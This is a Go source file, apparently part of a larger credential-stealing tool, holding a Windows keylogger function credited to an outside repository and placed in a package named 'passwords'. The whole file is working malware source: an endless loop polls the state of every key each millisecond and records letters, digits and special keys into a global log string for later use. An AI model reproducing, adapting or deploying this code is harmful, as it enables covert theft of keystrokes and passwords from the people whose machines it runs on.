package passwords

/*
**
**	Code by: @SaturnsVoid
**	Source repo: https://github.com/SaturnsVoid/Windows-KeyLogger
**
*/

import (
	"time"

	"github.com/AllenDang/w32"
	"../utils"
)

func KeyLogger() {
	for {
		time.Sleep(1 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := utils.ProcGetAsyncKeyState.Call(uintptr(KEY))
			if int(Val) == -32767 {
				switch KEY {
				case w32.VK_CONTROL:
					utils.TmpKeylog += "[Ctrl]"
				case w32.VK_BACK:
					utils.TmpKeylog += "[Back]"
				case w32.VK_TAB:
					utils.TmpKeylog += "[Tab]"
				case w32.VK_RETURN:
					utils.TmpKeylog += "[Enter]\r\n"
				case w32.VK_SHIFT:
					utils.TmpKeylog += "[Shift]"
				case w32.VK_MENU:
					utils.TmpKeylog += "[Alt]"
				case w32.VK_CAPITAL:
					utils.TmpKeylog += "[CapsLock]"
				case w32.VK_ESCAPE:
					utils.TmpKeylog += "[Esc]"
				case w32.VK_SPACE:
					utils.TmpKeylog += " "
				case w32.VK_PRIOR:
					utils.TmpKeylog += "[PageUp]"
				case w32.VK_NEXT:
					utils.TmpKeylog += "[PageDown]"
				case w32.VK_END:
					utils.TmpKeylog += "[End]"
				case w32.VK_HOME:
					utils.TmpKeylog += "[Home]"
				case w32.VK_LEFT:
					utils.TmpKeylog += "[Left]"
				case w32.VK_UP:
					utils.TmpKeylog += "[Up]"
				case w32.VK_RIGHT:
					utils.TmpKeylog += "[Right]"
				case w32.VK_DOWN:
					utils.TmpKeylog += "[Down]"
				case w32.VK_SELECT:
					utils.TmpKeylog += "[Select]"
				case w32.VK_PRINT:
					utils.TmpKeylog += "[Print]"
				case w32.VK_EXECUTE:
					utils.TmpKeylog += "[Execute]"
				case w32.VK_SNAPSHOT:
					utils.TmpKeylog += "[PrintScreen]"
				case w32.VK_INSERT:
					utils.TmpKeylog += "[Insert]"
				case w32.VK_DELETE:
					utils.TmpKeylog += "[Delete]"
				case w32.VK_HELP:
					utils.TmpKeylog += "[Help]"
				case w32.VK_LWIN:
					utils.TmpKeylog += "[LeftWindows]"
				case w32.VK_RWIN:
					utils.TmpKeylog += "[RightWindows]"
				case w32.VK_APPS:
					utils.TmpKeylog += "[Applications]"
				case w32.VK_SLEEP:
					utils.TmpKeylog += "[Sleep]"
				case w32.VK_NUMPAD0:
					utils.TmpKeylog += "[Pad 0]"
				case w32.VK_NUMPAD1:
					utils.TmpKeylog += "[Pad 1]"
				case w32.VK_NUMPAD2:
					utils.TmpKeylog += "[Pad 2]"
				case w32.VK_NUMPAD3:
					utils.TmpKeylog += "[Pad 3]"
				case w32.VK_NUMPAD4:
					utils.TmpKeylog += "[Pad 4]"
				case w32.VK_NUMPAD5:
					utils.TmpKeylog += "[Pad 5]"
				case w32.VK_NUMPAD6:
					utils.TmpKeylog += "[Pad 6]"
				case w32.VK_NUMPAD7:
					utils.TmpKeylog += "[Pad 7]"
				case w32.VK_NUMPAD8:
					utils.TmpKeylog += "[Pad 8]"
				case w32.VK_NUMPAD9:
					utils.TmpKeylog += "[Pad 9]"
				case w32.VK_MULTIPLY:
					utils.TmpKeylog += "*"
				case w32.VK_ADD:
					utils.TmpKeylog += "+"
				case w32.VK_SEPARATOR:
					utils.TmpKeylog += "[Separator]"
				case w32.VK_SUBTRACT:
					utils.TmpKeylog += "-"
				case w32.VK_DECIMAL:
					utils.TmpKeylog += "."
				case w32.VK_DIVIDE:
					utils.TmpKeylog += "[Devide]"
				case w32.VK_F1:
					utils.TmpKeylog += "[F1]"
				case w32.VK_F2:
					utils.TmpKeylog += "[F2]"
				case w32.VK_F3:
					utils.TmpKeylog += "[F3]"
				case w32.VK_F4:
					utils.TmpKeylog += "[F4]"
				case w32.VK_F5:
					utils.TmpKeylog += "[F5]"
				case w32.VK_F6:
					utils.TmpKeylog += "[F6]"
				case w32.VK_F7:
					utils.TmpKeylog += "[F7]"
				case w32.VK_F8:
					utils.TmpKeylog += "[F8]"
				case w32.VK_F9:
					utils.TmpKeylog += "[F9]"
				case w32.VK_F10:
					utils.TmpKeylog += "[F10]"
				case w32.VK_F11:
					utils.TmpKeylog += "[F11]"
				case w32.VK_F12:
					utils.TmpKeylog += "[F12]"
				case w32.VK_NUMLOCK:
					utils.TmpKeylog += "[NumLock]"
				case w32.VK_SCROLL:
					utils.TmpKeylog += "[ScrollLock]"
				case w32.VK_LSHIFT:
					utils.TmpKeylog += "[LeftShift]"
				case w32.VK_RSHIFT:
					utils.TmpKeylog += "[RightShift]"
				case w32.VK_LCONTROL:
					utils.TmpKeylog += "[LeftCtrl]"
				case w32.VK_RCONTROL:
					utils.TmpKeylog += "[RightCtrl]"
				case w32.VK_LMENU:
					utils.TmpKeylog += "[LeftMenu]"
				case w32.VK_RMENU:
					utils.TmpKeylog += "[RightMenu]"
				case w32.VK_OEM_1:
					utils.TmpKeylog += ";"
				case w32.VK_OEM_2:
					utils.TmpKeylog += "/"
				case w32.VK_OEM_3:
					utils.TmpKeylog += "`"
				case w32.VK_OEM_4:
					utils.TmpKeylog += "["
				case w32.VK_OEM_5:
					utils.TmpKeylog += "\\"
				case w32.VK_OEM_6:
					utils.TmpKeylog += "]"
				case w32.VK_OEM_7:
					utils.TmpKeylog += "'"
				case w32.VK_OEM_PERIOD:
					utils.TmpKeylog += "."
				case 0x30:
					utils.TmpKeylog += "0"
				case 0x31:
					utils.TmpKeylog += "1"
				case 0x32:
					utils.TmpKeylog += "2"
				case 0x33:
					utils.TmpKeylog += "3"
				case 0x34:
					utils.TmpKeylog += "4"
				case 0x35:
					utils.TmpKeylog += "5"
				case 0x36:
					utils.TmpKeylog += "6"
				case 0x37:
					utils.TmpKeylog += "7"
				case 0x38:
					utils.TmpKeylog += "8"
				case 0x39:
					utils.TmpKeylog += "9"
				case 0x41:
					utils.TmpKeylog += "a"
				case 0x42:
					utils.TmpKeylog += "b"
				case 0x43:
					utils.TmpKeylog += "c"
				case 0x44:
					utils.TmpKeylog += "d"
				case 0x45:
					utils.TmpKeylog += "e"
				case 0x46:
					utils.TmpKeylog += "f"
				case 0x47:
					utils.TmpKeylog += "g"
				case 0x48:
					utils.TmpKeylog += "h"
				case 0x49:
					utils.TmpKeylog += "i"
				case 0x4A:
					utils.TmpKeylog += "j"
				case 0x4B:
					utils.TmpKeylog += "k"
				case 0x4C:
					utils.TmpKeylog += "l"
				case 0x4D:
					utils.TmpKeylog += "m"
				case 0x4E:
					utils.TmpKeylog += "n"
				case 0x4F:
					utils.TmpKeylog += "o"
				case 0x50:
					utils.TmpKeylog += "p"
				case 0x51:
					utils.TmpKeylog += "q"
				case 0x52:
					utils.TmpKeylog += "r"
				case 0x53:
					utils.TmpKeylog += "s"
				case 0x54:
					utils.TmpKeylog += "t"
				case 0x55:
					utils.TmpKeylog += "u"
				case 0x56:
					utils.TmpKeylog += "v"
				case 0x57:
					utils.TmpKeylog += "w"
				case 0x58:
					utils.TmpKeylog += "x"
				case 0x59:
					utils.TmpKeylog += "y"
				case 0x5A:
					utils.TmpKeylog += "z"
				}
			}
		}
	}
}
